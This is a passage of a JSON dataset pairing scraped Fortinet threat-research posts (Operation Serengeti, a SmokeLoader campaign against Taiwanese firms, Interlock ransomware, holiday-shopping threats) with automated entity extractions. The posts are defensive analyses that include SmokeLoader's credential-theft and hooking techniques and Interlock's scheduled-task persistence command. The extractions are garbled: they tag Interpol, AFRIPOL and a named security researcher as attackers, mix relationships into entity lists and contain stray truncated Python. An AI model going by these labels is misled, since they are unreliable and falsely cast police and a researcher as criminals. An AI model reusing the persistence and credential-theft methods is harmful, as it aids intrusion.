research, including C2, malware, and botnet victims in Africa. This enabled member countries to identify more than 1,000 malicious IP addresses, dark web markets, and individual threat actors. Turning the tide against cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale. No single organization can effectively halt cybercrime alone. These arrests are a strong example of how public-private partnerships can impact the disruption of large-scale cybercrime activities, leading to a safer, more resilient society. Every organization has a place in the chain of disruption against cyberthreats. Creating ongoing collaboration opportunities with high-profile, well-respected organizations from both the public and private sectors is a fundamental aspect of Fortinet’s commitment to enhancing cyber resilience around the globe. By working together, we can make meaningful progress in disrupting adversary operations. cybercrime,derek manky FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity Type), (International Criminal Police Organization, Attacker), (African Union Mechanism for Police Cooperation, Attacker), (cybercrime groups, Threat Type), (ransomware, Threat Type), (digital extortion, Threat Type), (online scams, Threat Type), (business email compromise (BEC) attacks, Threat Type), (Operation Serengeti, Campaign), (Fortinet, Tool), (Cybercrime Atlas, Collaboration), (World Economic Forum’s Partnership Against Cybercrime, Collaboration), (participating countries, Target), (Malicious infrastructures and networks, Target), (Interpol, Attacker), (AFRIPOL, Attacker), (Fortinet, Tool), (private contributing partner, Partner), (Operation Serengeti, Campaign), (19 participating countries, Target), (Arrested, Action), (Dismantled, Action), (Malicious infrastructures and networks, Target), (Authorities, Target), (Intelligence, Action), (Analysis, Action), (Disrupting criminal activities, Action)\nRelationships: (FortiGuard Labs Threat Research, uses, Operation Serengeti), (Operation Serengeti, launchedBy, FortiGuard Labs Threat Research), (Operation Serengeti, involves, Fortinet), (Operation Serengeti, involves, Cyberspace), (Operation Serengeti, involves, Inter",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity Type"
        ],
        [
          "International Criminal Police Organization",
          "Attacker"
        ],
        [
          "African Union Mechanism for Police Cooperation",
          "Attacker"
        ],
        [
          "cybercrime groups",
          "Threat Type"
        ],
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "digital extortion",
          "Threat Type"
        ],
        [
          "online scams",
          "Threat Type"
        ],
        [
          "Operation Serengeti",
          "Campaign"
        ],
        [
          "Fortinet",
          "Tool"
        ],
        [
          "Cybercrime Atlas",
          "Collaboration"
        ],
        [
          "World Economic Forum’s Partnership Against Cybercrime",
          "Collaboration"
        ],
        [
          "participating countries",
          "Target"
        ],
        [
          "Malicious infrastructures and networks",
          "Target"
        ],
        [
          "Interpol",
          "Attacker"
        ],
        [
          "AFRIPOL",
          "Attacker"
        ],
        [
          "Fortinet",
          "Tool"
        ],
        [
          "private contributing partner",
          "Partner"
        ],
        [
          "Operation Serengeti",
          "Campaign"
        ],
        [
          "19 participating countries",
          "Target"
        ],
        [
          "Arrested",
          "Action"
        ],
        [
          "Dismantled",
          "Action"
        ],
        [
          "Malicious infrastructures and networks",
          "Target"
        ],
        [
          "Authorities",
          "Target"
        ],
        [
          "Intelligence",
          "Action"
        ],
        [
          "Analysis",
          "Action"
        ],
        [
          "Disrupting criminal activities",
          "Action"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "Operation Serengeti"
        ],
        [
          "Operation Serengeti",
          "launchedBy",
          "FortiGuard Labs Threat Research"
        ],
        [
          "Operation Serengeti",
          "involves",
          "Fortinet"
        ],
        [
          "Operation Serengeti",
          "involves",
          "Cyberspace"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 26,
    "relationship_count": 4
  },
  {
    "title": "SmokeLoader Attack Targets Companies in Taiwan",
    "link": "https://www.fortinet.com/blog/threat-research/sophisticated-attack-targets-taiwan-with-smokeloader",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In September 2024, FortiGuard Labs observed an attack using the notorious SmokeLoader malware to target companies in Taiwan, including those in manufacturing, healthcare, information technology, and other sectors. SmokeLoader is well-known for its versatility and advanced evasion techniques, and its modular design allows it to perform a wide range of attacks. While SmokeLoader primarily serves as a downloader to deliver other malware, in this case, it carries out the attack itself by downloading plugins from its C2 server. Figure 2 shows a phishing email used in this campaign. The sender claims the attached malicious file is a quotation and includes a list of special instructions. While this email is persuasive, as it uses native words and phrases, these phishing emails are sent to multiple recipients with almost the same content. Even the recipient's name (the redaction in the file name) is not changed when sent to other companies. This has been observed in other attack chains of this campaign. In addition, the font and color of the email sign-off and telephone number are different from the main body, which suggests that the text may have been copied from elsewhere. Regardless of which it uses, the third stage uses a VBS file to launch the malware loader, AndeLoader, and the final payload is an identical file of SmokeLoader. CVE-2017-0199 is a vulnerability in Microsoft Office that exploits an OLE2-embedded link object. When a victim opens the crafted file, a malicious document is automatically downloaded and executed. The file attached to the phishing email is protected, and the object containing the malicious link is hidden in a sheet. CVE 2017-11882 is an RCE (Remote Code Execution) vulnerability in the equation editor in Microsoft Office. The shellcode contains a decryption algorithm and encrypted data. After the decryption, the shellcode gets the necessary APIs and downloads the VBS file for the next stage with theURLDownloadToFilefunction. The HTA file contains VBS code that is encoded using URL-encoded several times. After decoding, we see a VBS script with numerous spaces inserted between symbols and variables. Additionally, long variable names are used to frustrate analysis. The VBS script executes a snippet of PowerShell code, which downloads the VBS file for AndeLoader. Below is the deobfuscated PowerShell code. It downloads a steganographic image that contains base64-encoded data of the injector and extracts the data enclosed by<<BASE64_START>>and<<BASE64_END>>. After this, the data is decoded into the injector and itsdnlib.IO.Home.VAImethod, which receives six arguments: download link of the data for SmokeLoader, flag for persistence, file path, filename, injection target, and an unused argument. In this case, the persistence feature is not used, so the second, third, and fourth arguments are just filled withdestivado, which translates to “disabled” in English. TheClass.Startmethod combines all VBS files in the current working path of cmd.exe into a VBS file whose path and filename are specified by the third and fourth arguments ofTools.Ande,respectively. The file path is written to a new value namedPathin theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key to make the VBS file execute automatically when the system starts up. If this feature is used, it enables the VBS file downloaded in the previous stage to persist. After this, the TXT file specified by the first argument ofTools.Andeis downloaded, and its data is deobfuscated to get SmokeLoader, which is later injected intoRegAsm.exe. The following process of injection is commonly used: Below is SmokeLoader's execution flow. This section focuses on the plugins downloaded from its C2 server. Figure 14 shows that, though the response is404 Not Found, it still contains the payload for the attack. The payload contains configurations and the encrypted data for plugins: In this case, it contains configurations for Plugin 4, 5 (fgclearcookies), 8, and 9 (keylog_rules). This will be introduced later. Nine plugins are received from the C2 server, including three individual plugins and three plugins with 32-bit and 64-bit versions. According to the plugin's architecture, SmokeLoader uses a loop to sequentially inject these plugins intoexplorer.exe. SmokeLoader creates a suspended process ofexplorer.exeand writes encrypted data of the plugin and decryption algorithm along with a snippet of shellcode used to call the decryption algorithm. After this, it changes the code at the start of the entry point of explorer.exe into a jump to the shellcode and callsResumeThreadto execute the plugin. Below is the plugin list: Plugin 1 32-bits Steals login credentials, FTP credentials, cookies, autofill data from browsers, email software, and FTP client Plugin 2 64-bits Steals login credentials from Firefox and Thunderbird. The function is the same as what Plugin 1 uses. Plugin 3 32-bits Read data from email software Plugin 4 32-bits Injects its code into the browser and sets a hook to steal data Plugin 5 64-bits The 64-bit version of Plugin 4 Plugin 6 32-bits Injects its code into email software, browser, and FTP client and sets a hook to steal data Plugin 7 64-bits The 64-bit version of Plugin 6 Plugin 8 32-bits Injects its code into explorer.exe or processes specified by C2 server and sets a hook to steal data Plugin 9 64-bits The 64-bit version of Plugin 8 This plugin uses a loop to sequentially execute functions for the target software. The functions can be categorized into the following types according to the target: This plugin leverages functions in vaultcli.dll to get login credentials from Internet Explorer. Credential Manager is a feature in the Windows system that is used to store passwords. vaultcli.dll provides the functions to enumerate and get information from the credential vault. This plugin enumerates the registry keys underSoftware\\Mozillato find the one containing the valuePathToExeto get the default location of Firefox and Thunder. Then, the plugin searches forprofiles.iniin the default location and parses it to get the location oflogins.jsonandcookies.sqlite, from which it extracts login credentials. The plugin searches for theLocal Statefile withinWeb Data,Cookies,andLogin Datafolders under the installation path and then extracts login credentials and auto-fill data. To ensure it can locate the target file, it searches the following locations: It enumerates the registry keys under possible related registry keys to find the following values: It searches forsitemanager.xml,recentservers.xml, andfilezilla.xmlin the installation folder under%APPDATA%,%LOCALAPPDATA%orC:\\ProgramDatato collect the content in thehost,Port,User, andPasstags in these files. It enumerates the registry keys underSoftware\\Martin Prikrylto find theHostName,UserName,Password,RemoteDirectory, andPortNumbervalues. Email client keyword Path Outlook .pst, .ost Thunderbird .mab, .msf, inbox, sent, draft, template, archive The Bat! .tbb, .tbn, .abn When a data file is found, the plugin parses its structure to obtain the email addresses of people who sent an email to the victim or who received a copy of the email. The email addresses are then sent to the C2 server, and the process is closed. iexplore.exe, microsoftedge.exe, microsoftedgecp.exe, firefox.exe, chrome.exe, opera.exe, msedge.exe, plugin-container.exe (sub-process of Firefox, the relevant cookies are for Macromedia flash player) It then constantly monitors currently running processes and injects the other part of the plugin into target browsers to hook specified APIs. Like other plugins, the injected code includes shellcode, a decryption algorithm, and encrypted data. The difference is that the code for the jump to the shell code is written to theatanfunction ofntdll,and the plugin callsCreateRemoteThreadto run theatanfunction in the target process. The plugin hooks different APIs depending on where it is injected: Process DLL API firefox.exe Kernel32.dll VirtualQuery nspr4.dll or nss3.dll PR_GetDescType nspr4.dll PR_Write iexplore.exe microsoftedgecp.exe wininet.dll msedge.dll, chrome.dll, opera.dll, opera_browser.dll Unknown function Before setting the hook, it suspends threads except for the current thread of the injected process. Next, it modifies code at the start of the target APIs to jump to the function to send data passed to the API to the C2 server. The plugin obtains the addresses of most target APIs by callingGetProcAddress. The only exception is the method to get the unknown function in DLL files related to the browsers based on Chromium. It parses the structure of the.rdatasection to find the function matching a specific byte pattern. When the hooks are set, the plugin resumes other threads of the current process and terminates the current thread. Plugin 6 uses the same method to inject hooking code snippets into target processes. The API functions to hook areWSASendand thesendfunction inws2_32.dll. When these functions are called, the plugin collects FTP, SMTP, IMTP, and POP3 hostnames. DLL API Target user32.dll TranslateMessage Keyboard states and the window name where the user inputs the data GetClipboardData Get clipboard content SmokeLoader is a modular malware that is adaptable to different needs. In this case, SmokeLoader performs its attack with its plugins instead of downloading a completed file for the final stage. This shows the flexibility of SmokeLoader and emphasizes that analysts need to be careful even when looking at well-known malware like this. FortiGuard will continue monitoring these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked by FortiGuardAntivirusas: JS/Kryptik.CTS!tr.dldrVBS/TrojanDownloader.AAWM!tr.dldrW32/Smokeloader.F!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuardCDR(content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 198[.]23[.]188[.]14777[.]232[.]41[.]2991[.]183[.]104[.]24185[.]228[.]234[.]237 3e523ed80dbb592b1ff8c3345c3cd231ddd5a06e1af4c7b7d1f7f81249d0c4a3ad657479d9f6322daba65638523d65631ff83ba5a717261acb5a53fd48e522098dc06fdc2897d7c3438105ea0a39d2074774f80e051007fe7799b8195580ad2ffbe226dd0130c3c0c4db9d125cd25eca3c8e310dae8127d15c8be18041d41cd6392d201120936c1f0e77bdb4b490f2825c1e6f584f18055c742b36250f89566be29c269a4c3ee4bbd673bfe0d24ca7d131d9221607e26a60989e81d8ffc1709500874ab2a91433dfbfdc9ee6ade6173f3280737fc81505504ace11273f6406101a1c8cdac1c3cbae5f1140e850ee06b414259876dab97152669f7c0f93469b135dc92a6ed1ef2a5d9cf2a112532ad2c9fd70bff727e4cb60cd5d9c4966f2f77fa334ba0d8ac0676d09e41aa273589ee27338c44a09109a4d5defa45f1d9bd82b35e55053bed6b3c1027a3e7c140e67303e01e8fcbf42abac27b8e9df2a090ee3858d26e697bc60b642e5d92922b625f58532fc06f028962d8add5fa497981f337f9909677c290b98541be176251eca34b9f3d36555669a2639130adb97ca6958f4b16c3f8bff445fdcd9d7edb5883d20d7663c3744e137439fa961736d0a9471fb6ef14ac4cebf87f937f15553575f0f62ac62df917b490f602025a0985addd19dea895b5b1c03caa2b838b8def4e082392851325794c3bd2eb5ca7372d8e09ccfe7f6c1c0560bd56cd2df856d459b7fe7fd63b2f635c35151f61d4d04ce4162 a4ec792538455fb56f0b89ae10ddd0b2504afba092ba5cfa2083cf61b5fac0efcb92d320fc9bc674e8d37ceeebf0363f8e96dd67ef4ef543b3348f96ef567e5feb8381b156aad734ef3a0328b4985ed1edeca1c8d79d66e094598f8c6992ac71e3e7a3d0ba55b8dbbe3633b1dad0a3bbf4eada72dd8df3f7b1bc76a692862f23ea3b07a2356a7bfb92144f621ba551677a138c31d684072d69a4d37c1a378bb37ab20d40431b990a9a44e96dc53519f0af72eaf56c4b20f8995f95a48039bf67bdb897e6a8bfc21302ae1ac254b1b2e779684fe75b2b824cb24c80c775898940 f7544f07b4468e38e36607b5ac5b3835eac1487e7d16dd52ca882b3d021c19b6 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (SmokeLoader, Malware), (Taiwan, Location), (VBS file, File), (AndeLoader, Malware), (idem, File)\\nRelationships: (FortiGuard Labs, observes, attack), (SmokeLoader, uses, VBS file), (SmokeLoader, uses, AndeLoader), (SmokeLoader, contains, idem) ```python\nimport re\r\n\r\ndef extract_entities_and_relationships(text):\r\n    # Extract named entities\r\n    entities = []\r\n    pattern = r'\\b\\w+\\b'\r\n    matches = re.findall(pattern, text)\r\n    for entity in matches:\r\n        if entity.lower() == \"malware\":\r\n            entities.append((entity, \"Malware\"))\r\n        elif entity.lower() == \"threat type\" or entity.lower() == \"attack technique\" or entity.lower() == \"tool\" or entity.lower() == \"vulnerability\" or entity.lower() == \"ip\" or entity.lower() == \"domain\" or entity.lower() == \"url\" or entity.lower() == \"file\" or entity.lower() == \"hash\":\r\n            entities.append((entity, \"Technique\"))\r\n        elif entity.lower() == \"attacker\" or entity.lower() == \"group\":\r\n            entities.append((entity, \"Attacker\"))\r\n        elif entity.lower() == \"technique\" or entity.lower() == \"ttp\":\r\n            entities.append((entity, \"Technique",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "SmokeLoader",
          "Malware"
        ],
        [
          "Taiwan",
          "Location"
        ],
        [
          "VBS file",
          "File"
        ],
        [
          "AndeLoader",
          "Malware"
        ],
        [
          "idem",
          "File"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "attack"
        ],
        [
          "SmokeLoader",
          "uses",
          "VBS file"
        ],
        [
          "SmokeLoader",
          "uses",
          "AndeLoader"
        ],
        [
          "SmokeLoader",
          "contains",
          "idem"
        ],
        [
          "pattern",
          "text"
        ],
        [
          "(entity",
          "\"Malware\""
        ],
        [
          "(entity",
          "\"Technique\""
        ],
        [
          "(entity",
          "\"Attacker\""
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 0
  },
  {
    "title": "Ransomware Roundup - Interlock",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-interlock",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Interlock ransomware. Affected platforms:Microsoft Windows, FreeBSDImpacted parties:Microsoft Windows and FreeBSD usersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Interlock is a new ransomware variant that was first submitted to a publicly available file-scanning site in early October 2024. This could indicate that the ransomware emerged as early as September or even earlier. The Interlock ransomware comes in Windows and FreeBSD versions. It encrypts files on victims' machines and demands a ransom to decrypt them via dropped ransom notes. While the initial infection vector of the Interlock ransomware has not been identified, researcher Sina Kheirkhah(@SinSinology)reportedthat a previously unknown backdoor was found on a victim’s machine. It is possible that the ransomware was deployed through this backdoor. The Windows version of the ransomware claims to support the following versions of Windows: The Interlock ransomware takes the following parameters on execution: Once executed, the Interlock ransomware encrypts files on victims’ machines and drops a ransom note labeled “!__README__!.txt”. Files encrypted by the Interlock ransomware will have a “.interlock” file extension. The ransomware is designed to exclude the following files and filetypes from file encryption: .bat .bin .cab .cmd .com .cur .diagcab .diagcfg .diagpkg .drv .hlp .hta .ico .msi .ocx .psm1 .scr .sys .ini Thumbs.db .url .dll .exe .ps1 It also excludes the following folders from file encryption: $Recycle.Bin Boot Documents and Settings PerfLogs ProgramData Recovery System Volume Information Windows It also creates a scheduled task named \"TaskSystem\": schtasks /create /sc DAILY /tn \"TaskSystem\" /tr \"cmd /C cd %s && %s\" /st 20:00 /ru system > nul The above script creates a new scheduled task, TaskSystem, that runs every day at 20:00 using the System account. The FreeBSD version of the ransomware takes parameters on execution: Once the ransomware is executed, it encrypts files on victims' machines using the AES-CBC encryption algorithm and adds an \".interlock\" extension to the encrypted files. The ransomware then leaves a text file containing the same ransom note as the Windows version. The FreeBSD version of the Interlock ransomware skips files with an “.interlock”  extension from file encryption. It also excludes the following directories from file encryption: /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /run /root /sbin /snap /srv /sys /tmp /usr /var It also avoids encrypting the following file: At the time of our investigation, the Interlock ransomware data leak site listed six victims. Five of those were in the United States, and the other was in Italy. However, submission data to the publicly available scanning service potentially shows even broader victim locations. Interlock ransomware samples have been submitted from India, Italy, Japan, Germany, Peru, South Korea, Turkey, and the United States. The victims are in the education, finance, government, healthcare, and manufacturing sectors, indicating that the Interlock ransomware does not have a policy to avoid targeting essential businesses and organizations, as some other ransomware groups have. Each victim has its own page describing the victim’s organization and lists stolen and leaked files. The Interlock ransomware runs its data leak site on TOR, which is divided into the following four sections: The Interlock ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution, so customers with these products have up-to-date protection. Interlock Ransomware File IOCs SHA2 Note a26f0a2da63a838161a7d335aaa5e4b314a232acc15dcabdb6f6dbec63cda642 Interlock ransomware (Windows version) 28c3c50d115d2b8ffc7ba0a8de9572fbe307907aaae3a486aabd8c0266e9426f Interlock ransomware (FreeBSD version) e86bb8361c436be94b0901e5b39db9b6666134f23cce1e5581421c2981405cb1 f00a7652ad70ddb6871eeef5ece097e2cf68f3d9a6b7acfbffd33f82558ab50e IOCs of the backdoor malware reported by Sina Kheirkhah (@SinSinology) SHA2 Note e9ff4d40aeec2ff9d2886c7e7aea7634d8997a14ca3740645fd3101808cc187b Backdoor malware allegedly found on the Interock ransomware victim’s machine 7d750012afc9f680615fe3a23505f13ab738beef50cd92ebc864755af0775193 6933141fbdcdcaa9e92d6586dd549ac1cb21583ba9a27aa23cf133ecfdf36ddf It is vital to keep all AV and IPS signatures up to date due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and unwanted destruction or release of personally identifiable information (PII). Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance against phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, Fortinet delivers native synergy and automation across your security ecosystem. It also provides an extensive portfolio of technology- and human-based as-a-service offerings powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts. It provides unrivaled threat intelligence on the latest threat actor activity across the dark web, enabling a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to respond rapidly to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (ransomware, Threat Type), (Interlock ransomware, Malware), (Windows, Platform), (FreeBSD, Platform), (Sina Kheirkhah, Attacker), (backdoor, Technique), (Windows version, Version), (ransomware, Version)\nRelationships: (FortiGuard Labs, provides, ransomware data), (ransomware, uses, Interlock ransomware), (Interlock ransomware, contains, Windows version), (Interlock ransomware, executes, once executed), (ransomware, targets, Windows), (ransomware, targets, FreeBSD), (ransomware, impacts, encrypted files), (ransomware, requires, ransom for decryption), (ransomware, severityLevel, High), (ransomware, discovered, early October 2024), (ransomware, impactedParties, Microsoft Windows and FreeBSD users), (ransomware, reported, Sina Kheirkhah), (ransomware, detected, backdoor), (ransomware, deployed, through backdoor), (ransomware, supportedVersions, Windows)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "Interlock ransomware",
          "Malware"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "FreeBSD",
          "Platform"
        ],
        [
          "Sina Kheirkhah",
          "Attacker"
        ],
        [
          "backdoor",
          "Technique"
        ],
        [
          "Windows version",
          "Version"
        ],
        [
          "ransomware",
          "Version"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "provides",
          "ransomware data"
        ],
        [
          "ransomware",
          "uses",
          "Interlock ransomware"
        ],
        [
          "Interlock ransomware",
          "contains",
          "Windows version"
        ],
        [
          "Interlock ransomware",
          "executes",
          "once executed"
        ],
        [
          "ransomware",
          "targets",
          "Windows"
        ],
        [
          "ransomware",
          "targets",
          "FreeBSD"
        ],
        [
          "ransomware",
          "impacts",
          "encrypted files"
        ],
        [
          "ransomware",
          "requires",
          "ransom for decryption"
        ],
        [
          "ransomware",
          "severityLevel",
          "High"
        ],
        [
          "ransomware",
          "discovered",
          "early October 2024"
        ],
        [
          "ransomware",
          "impactedParties",
          "Microsoft Windows and FreeBSD users"
        ],
        [
          "ransomware",
          "reported",
          "Sina Kheirkhah"
        ],
        [
          "ransomware",
          "detected",
          "backdoor"
        ],
        [
          "ransomware",
          "deployed",
          "through backdoor"
        ],
        [
          "ransomware",
          "supportedVersions",
          "Windows"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 15
  },
  {
    "title": "Advanced Cyberthreats Targeting Holiday Shoppers",
    "link": "https://www.fortinet.com/blog/threat-research/advanced-cyberthreats-targeting-holiday-shoppers",
    "content": "FortiGuard Labs Threat Research As the holiday season approaches, shoppers worldwide eagerly anticipate snagging deals during Black Friday, Cyber Monday, and other holiday sales. However, this heightened online activity also draws the attention of cybercriminals. A recent report from FortiGuard Labs,Understanding Threat Actor Readiness for the Upcoming Holiday Season, reveals the advanced tactics attackers have been developing to exploit this year’s shopping frenzy. This blog highlights the report’s key findings from the darknet and offers some practical advice to help shoppers and businesses stay secure this season. The holiday season presents an irresistible opportunity for cybercriminals to capitalize on increased online transactions. Tools and services now available on the darknet empower attackers to target e-commerce platforms and unsuspecting shoppers more effectively than ever. This year, threat actors are leveraging cutting-edge techniques, including AI-powered phishing lures, sophisticated website cloning tools, and remote code execution (RCE) exploits to gain unauthorized access to shopping platforms. AI-driven methods allow attackers to craft convincing emails and replicas of legitimate websites to steal data or trick users into disclosing sensitive information. The report also highlights the growing use of deceptive holiday-themed domains that mimic trusted retailers to lure shoppers with enticing but fraudulent offers. Sniffing tools are another critical weapon that enables cybercriminals to intercept sensitive data like credit card details during online transactions. Key highlights from the report include: To mitigate these risks, shoppers and businesses must adopt proactive measures. Vigilance is essential for shoppers. Double-check URLs before entering sensitive information and use secure payment methods such as credit cards with fraud protection. Avoid shopping over public Wi-Fi networks, which can leave you vulnerable to session hijacking. And enabling multi-factor authentication on your accounts can provide an additional layer of security. It is also crucial to monitor your financial statements regularly for unauthorized transactions. Businesses must prioritize their cybersecurity posture. Keeping e-commerce platforms and plugins up to date and conducting regular vulnerability scans can significantly reduce risk. Implementing advanced fraud detection tools helps identify unusual activities, such as brute-force login attempts or fake traffic. Educating customers on recognizing phishing attempts and promoting safe shopping habits is equally important. Monitoring domain registrations for potential impersonations and reporting them promptly can help protect your brand. Finally, securing admin panels with strong passwords and restricted access can prevent unauthorized breaches. The holiday season should be a time of joy and celebration, not risk and vulnerability. However, for this to happen, businesses must take a proactive stance on cybersecurity while consumers must stay informed and cautious about the threats lurking online. Download the FortiGuard Labs report,Understanding Threat Actor Readiness for the Upcoming Holiday Season, to better understand this year’s evolving threat landscape and gain actionable insights for protecting yourself, your business, and your customers. holiday shopping FortiGuard Labs Threat Research FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Company), (Black Friday, Event), (Cyber Monday, Event), (holiday sales, Event), (AI-powered phishing lures, Technique), (website cloning tools, Tool), (remote code execution (RCE) exploits, Technique), (deceptive holiday-themed domains, Domain), (sniffing tools, Tool)\\nRelationships: (FortiGuard Labs, publishes, Understanding Threat Actor Readiness for the Upcoming Holiday Season), (Understanding Threat Actor Readiness for the Upcoming Holiday Season, contains, key findings), (Understanding Threat Actor Readiness for the Upcoming Holiday Season, provides, practical advice), (black friday, associatedWith, holiday season), (cyber monday, associatedWith, holiday season), (holiday sales, associatedWith, holiday season), (AI-powered phishing lures, usedBy, attackers), (website cloning tools, usedBy, attackers), (remote code execution (RCE) exploits, usedBy, attackers), (deceptive holiday-themed domains, associatedWith, holiday season), (sniffing tools, associatedWith, holiday season) ```python\nimport re\r\n\r\ndef extract_entities_and_relationships(text):\r\n    named_entities = []\r\n    relationships = []\r\n\r\n    # Regular expressions for entity extraction\r\n    malware_pattern = r'\\b(?:Malware|Tool|Technique|Attacker|Vulnerability|IP|Domain|URL|File|Hash)\\b'\r\n    technique_pattern = r'",
      "entities": [
        [
          "FortiGuard Labs",
          "Company"
        ],
        [
          "Black Friday",
          "Event"
        ],
        [
          "Cyber Monday",
          "Event"
        ],
        [
          "holiday sales",
          "Event"
        ],
        [
          "AI-powered phishing lures",
          "Technique"
        ],
        [
          "website cloning tools",
          "Tool"
        ],
        [
          "deceptive holiday-themed domains",
          "Domain"
        ],
        [
          "sniffing tools",
          "Tool"
        ],
        [
          "FortiGuard Labs",
          "publishes",
          "Understanding Threat Actor Readiness for the Upcoming Holiday Season"
        ],
        [
          "Understanding Threat Actor Readiness for the Upcoming Holiday Season",
          "contains",
          "key findings"
        ],
        [
          "Understanding Threat Actor Readiness for the Upcoming Holiday Season",
          "provides",
          "practical advice"
        ],
        [
          "black friday",
          "associatedWith",
          "holiday season"
        ],
        [
          "cyber monday",
          "associatedWith",
          "holiday season"
        ],
        [
          "holiday sales",
          "associatedWith",
          "holiday season"
        ],
        [
          "AI-powered phishing lures",
          "usedBy",
          "attackers"
        ],
        [
          "website cloning tools",
          "usedBy",
          "attackers"
        ],
        [
          "deceptive holiday-themed domains",
          "associatedWith",
          "holiday season"
        ],
        [
          "sniffing tools",
          "associatedWith",
          "holiday season"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 0
  },
  {
    "title": "Threat Predictions for 2025: Get Ready for Bigger, Bolder Attacks",
    "link": "https://www.fortinet.com/blog/threat-research/threat-predictions-for-2025-get-ready-for-bigger-bolder-attacks",
